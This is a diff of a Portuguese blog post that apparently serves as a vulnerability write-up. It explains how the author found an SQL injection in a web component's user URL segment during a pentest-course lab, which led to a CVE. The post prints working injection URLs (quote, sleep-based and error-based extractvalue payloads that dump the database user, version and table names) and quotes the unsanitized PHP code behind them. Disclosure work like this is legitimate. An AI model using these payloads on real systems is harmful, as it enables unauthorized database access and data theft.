@@ -5,39 +5,37 @@ date: 2018-06-11
 categories: vulnerabilities
 ---
 
-A vulnerabilidade foi encontrada de uma forma um pouco inusitada, a alguns dias o Daybson estava subindo um laboratório de teste novo, para  o curso de Pentest Profissional da Desec Security, quando me chamou para testa-lo, eu em particular não sabia que vulnerabilidade havia no laboratório, apenas loguei e fui testar. Notei que na seguinte aba eu tinha o nome do usuário na url e me pareceu um pouco estranho, talvez fosse gerado um novo arquivo durante o registro ou algo assim, mas na verdade notei que aquilo não era um arquivo, era realmente um parâmetro da url. 
+	A vulnerabilidade foi encontrada de uma forma um pouco inusitada. A alguns dias o Daybson estava subindo um laboratório de teste novo, para  o curso de Pentest Profissional da Desec Security, quando me chamou para testa-lo, eu em particular não sabia que vulnerabilidade havia no laboratório, apenas loguei e fui testar. Notei que na seguinte aba eu tinha o nome do usuário na url e me pareceu um pouco estranho, talvez fosse gerado um novo arquivo durante o registro ou algo assim, mas na verdade notei que aquilo não era um arquivo, era realmente um parâmetro da url. 
 <br>
-O teste inicial foi logicamente foi adicionar uma aspas simples e ver o que iria me retornar:
+	O teste inicial foi logicamente foi adicionar uma aspas simples e ver o que iria me retornar:
 <br>
 <code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20a%23</code>
-<img src="0x1.png">
+<img src="https://i.imgur.com/AYHQAWL.png">
 <br>
-Então, seguindo o erro, temos um Sql Injection aqui!
-Fazendo mais um teste para confirmar, conseguimos ter a certeza disso:
+	Então, seguindo o erro, temos um Sql Injection aqui!
+	Fazendo mais um teste para confirmar, conseguimos ter a certeza disso:
 <br>
 <code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20sleep(5)%23</code>
-<img src="0x3.png">
+<img src="https://i.imgur.com/4LUyOHe.png">
 <br>
-Até este ponto estava tudo bem, porém notei uma limitação ao tentar dumpar a db no modo clássico, até mesmo usando blind. Me pareceu estranho não conseguir dumpar tudo, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection. 
-<br>
-Me pareceu estranho não conseguir dumpar tudo, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection.
+	Até este ponto estava tudo bem, porém notei uma limitação ao tentar dumpar a db no modo clássico, até mesmo usando blind. Me pareceu estranho não conseguir resposta para algumas querys, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection. 
 <br>
 <code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,user())%20%23</code>
 
-<img src="0x4.png">
+<img src="https://i.imgur.com/xZwEZAI.png">
 <br>
 <code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,version())%20%23</code>
-<img src="0x5.png">
+<img src="https://i.imgur.com/M7LCI6d.png">
 <br>
 <code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20database())))%20%23</code>
-<img src="0x6.png">
+<img src="https://i.imgur.com/8mRdLKG.png">
 <br>
 <code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables)))%20%23</code>
-<img src="0x7.png">
+<img src="https://i.imgur.com/QU7faTN.png">
 <br>
-Bom, a partir deste ponto, a melhor forma seria criar um script para fazer o dump!
+	Bom, a partir deste ponto, a melhor forma seria criar um script para fazer o dump!
 <br>
-Depois disso, eu ainda assim fiquei curioso para saber como que o componente estava capturando esta parte da url, então baixei o código dele e vasculhei até encontrar o seguinte trecho: 
+	Depois disso, eu ainda assim fiquei curioso para saber como que o componente estava capturando esta parte da url, então baixei o código dele e vasculhei até encontrar o seguinte trecho: 
 <br>
 <code>router.php</code>
 <br>
@@ -51,10 +49,10 @@ Depois disso, eu ainda assim fiquei curioso para saber como que o componente est
 244 - }
 {% endhighlight %}
 
-Fazendo uma analise rápida, sabemos que o <code>$c_id</code> esta capturando o segmento que está o nosso nome de usuário e adicionando ele a um array (<code>$vars</code>), podemos basicamente adivinhar que a função <code>EkrishtaUsrID()</code> está buscando o nosso id ou o nome do usuário no banco de dados, mas vamos ver o que realmente ela está fazendo. 
+	Fazendo uma analise rápida, sabemos que o <code>$c_id</code> esta capturando o segmento que está o nosso nome de usuário e adicionando ele a um array (<code>$vars</code>), podemos basicamente adivinhar que a função <code>EkrishtaUsrID()</code> está buscando o nosso id ou o nome do usuário no banco de dados, mas vamos ver o que realmente ela está fazendo. 
 <br>
 <br>
-Fazendo uma procura pela função <code>EkrishtaUsrID()</code>, encontrei ela presente no mesmo arquivo e é possível ver que que existe uma falta de sanitização nas linhas <code>295</code> e <code>305</code>.
+	Fazendo uma procura pela função <code>EkrishtaUsrID()</code>, encontrei ela presente no mesmo arquivo e é possível ver que que existe uma falta de sanitização nas linhas <code>295</code> e <code>305</code>.
 {% highlight php %}
 291 - function EkrishtaUsrName($uid)
 292 - {
@@ -77,4 +75,4 @@ Fazendo uma procura pela função <code>EkrishtaUsrID()</code>, encontrei ela pr
 309 - }
 {% endhighlight %}
 
-Para finalizar a história, a vulnerabilidade que eu encontrei não estava dentro daquilo que estava programado para o laboratório e também não estava assinada ou relacionada a qualquer outra descoberta, então peguei uma cve :).
+	Para finalizar a história, a vulnerabilidade que eu encontrei não estava dentro daquilo que estava programado para o laboratório e também não estava assinada ou relacionada a qualquer outra descoberta, então peguei uma cve :).
